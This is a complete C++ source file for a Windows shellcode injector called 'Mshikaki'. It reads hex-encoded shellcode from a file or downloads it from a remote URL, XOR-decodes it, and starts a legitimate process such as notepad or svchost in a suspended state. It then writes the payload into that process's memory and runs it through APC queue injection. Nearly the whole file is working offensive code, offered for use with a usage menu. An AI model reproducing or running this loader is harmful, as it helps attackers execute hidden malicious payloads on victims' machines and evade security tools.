#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <windows.h>
#include <wininet.h>
#include <iomanip>
#include <tlhelp32.h>
#include <stdlib.h>
#pragma comment(lib, "wininet.lib")


std::string banner =
" ##::::'##::'######::'##::::'##:'####:'##:::'##::::'###::::'##:::'##:'####:\n"
" ###::'###:'##... ##: ##:::: ##:. ##:: ##::'##::::'## ##::: ##::'##::. ##::\n"
" ####'####: ##:::..:: ##:::: ##:: ##:: ##:'##::::'##:. ##:: ##:'##:::: ##::\n"
" ## ### ##:. ######:: #########:: ##:: #####::::'##:::. ##: #####::::: ##::\n"
" ##. #: ##::..... ##: ##.... ##:: ##:: ##. ##::: #########: ##. ##:::: ##::\n"
" ##:.:: ##:'##::: ##: ##:::: ##:: ##:: ##:. ##:: ##.... ##: ##:. ##::: ##::\n"
" ##:::: ##:. ######:: ##:::: ##:'####: ##::. ##: ##:::: ##: ##::. ##:'####:\n"
"..:::::..:::......:::..:::::..::....::..::::..::..:::::..::..::::..::....::";

std::vector<char> Parser(const std::string& content) {
    std::ifstream inputFile(content);
    if (!inputFile) {
        std::cerr << "Failed to open file for reading." << std::endl;
        return {};
    }

    std::string line;
    std::vector<char> bytes;
    while (std::getline(inputFile, line)) {
        for (unsigned int i = 0; i < line.length(); i += 2) {
            std::string byteString = line.substr(i, 2);
            char byte = static_cast<char>(strtol(byteString.c_str(), NULL, 16));
            bytes.push_back(byte);
        }
    }
    // cout << "Size of the bytes: " << bytes.size() << endl;
    return bytes;
}

void XOR(char* data, size_t data_len, const char* key, size_t key_len) {
    for (size_t i = 0; i < data_len; ++i) {
        data[i] = data[i] ^ key[i % key_len];
    }
}

BOOL Injector(HANDLE hProcess, HANDLE hThread, const std::vector<char>& buf) {
    SIZE_T shellSize = buf.size();
    wprintf(L"[+] Allocating memory\n");

    LPVOID shellAddress = VirtualAllocEx(hProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (shellAddress == NULL) return FALSE;
    wprintf(L"[+] Writing shellcode into the process memory \n");

    if (WriteProcessMemory(hProcess, shellAddress, buf.data(), shellSize, NULL) == 0) return FALSE;

    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
    wprintf(L"[+] Queueing APC \n");

    QueueUserAPC((PAPCFUNC)apcRoutine, hThread, NULL);

    return TRUE;
}

bool FetchRemoteShellcode(const std::string& url, std::vector<char>& outShellcode) {
    HINTERNET hInternet, hConnect;
    DWORD bytesRead;
    char buffer[1024];

    hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return false;
    }

    hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return false;
    }

    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        outShellcode.insert(outShellcode.end(), buffer, buffer + bytesRead);
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return true;
}

void PrintHelpMenu(const std::string& programName) {
    std::cout << "Usage: " << programName << " [options]" << std::endl;
    std::cout << "Options:" << std::endl;
    std::cout << "  -i <filename> : Input file with shellcode in hex format" << std::endl;
    std::cout << "  -u <url>      : Fetch remote shellcode from the specified URL in hex format" << std::endl;
    std::cout << "  -p <process>  : Name of a process (optional, default is notepad)" << std::endl;
    std::cout << "  -x <key>      : Apply XOR decryption with the specified key (optional)" << std::endl;
    std::cout << "  -h            : Display this help menu" << std::endl;
    std::cout << "Example Usage: Mshikaki.exe -i input.txt -x SAUDISAUDI -p svchost.exe. \n  Mshikaki.exe -u input.txt " << std::endl; 
}

int main(int argc, char* argv[]) {
    std::cout << banner << std::endl;
    std::string inputContent;
    std::string remoteUrl;
    std::vector<char> xorKey;
    std::string processPath = "C:\\Windows\\System32\\notepad.exe"; // Default process path
    bool path = false;
    std::string actproc;
    bool useXOR = false;


    for (int i = 1; i < argc; ++i) {
        std::string argument = argv[i];
        if (argument == "-i" && i + 1 < argc) {
            inputContent = argv[i + 1];
        }
        else if (argument == "-u" && i + 1 < argc) {
            remoteUrl = argv[i + 1];
        }
        else if (argument == "-x" && i + 1 < argc) {
            std::string keyString = argv[i + 1];
            xorKey = std::vector<char>(keyString.begin(), keyString.end());
            useXOR = true;
        }
        else if (argument == "-h") {
            PrintHelpMenu(argv[0]);
            return 0;
        }
        else if (argument == "-p" && i + 1 < argc) {
            processPath = "C:\\Windows\\System32\\" + std::string(argv[i + 1]);
            actproc = std::string(argv[i + 1]);
            path = true;
        }

    }

    std::vector<char> payload;

    if (!inputContent.empty()) {
        payload = Parser(inputContent);
    }
    else if (!remoteUrl.empty()) {
        if (!FetchRemoteShellcode(remoteUrl, payload)) {
            std::cout << "Failed to fetch remote shellcode." << std::endl;
            return 1;
        }
    }
    else {
        std::cout << "Please specify an input file or remote file location with hex shellcode. Use -h for help menu." << std::endl;
        return 1;
    }

    if (useXOR && !xorKey.empty()) {
        XOR(payload.data(), payload.size(), xorKey.data(), xorKey.size());
    }

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    if (!CreateProcessA(processPath.c_str(), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        wprintf(L"ERROR: (%d) Unable to Create Process\n", GetLastError());
        return 1;
    }
    else if (path == true){
        std::cout << "[+] Creating " << actproc << " process in a suspended state \n";
    }

    if (!Injector(pi.hProcess, pi.hThread, payload)) {
        wprintf(L"ERROR: (%d) Unable to Inject into Process\n", GetLastError());
        return 1;
    }

    ResumeThread(pi.hThread);
    WaitForSingleObject(pi.hProcess, INFINITE);

    return 0;
}

